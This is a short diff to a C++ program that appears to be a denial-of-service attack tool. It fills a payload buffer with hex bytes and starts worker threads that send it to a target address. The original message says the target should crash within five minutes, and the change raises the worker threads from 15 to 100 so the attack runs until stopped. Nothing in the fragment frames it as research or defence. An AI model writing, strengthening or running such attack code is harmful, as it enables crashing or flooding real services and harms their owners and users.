@@ -19,11 +19,11 @@ int main(int argc, char* argv[]) {
     memcpy(&payload[9], "\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76", 10);
 
     vector<thread> workers;
-    for (int i = 0; i < 15; i++) {
+    for (int i = 0; i < 100; i++) {
         workers.push_back(thread(worker, addr, payload, 19));
     }
 
-    cout << "Started the attack. It should take up to 5 minutes for the target to crash.\r";
+    cout << "Press CTRL+C to stop the attacks";
 
     while (1) {
         Sleep(1000);
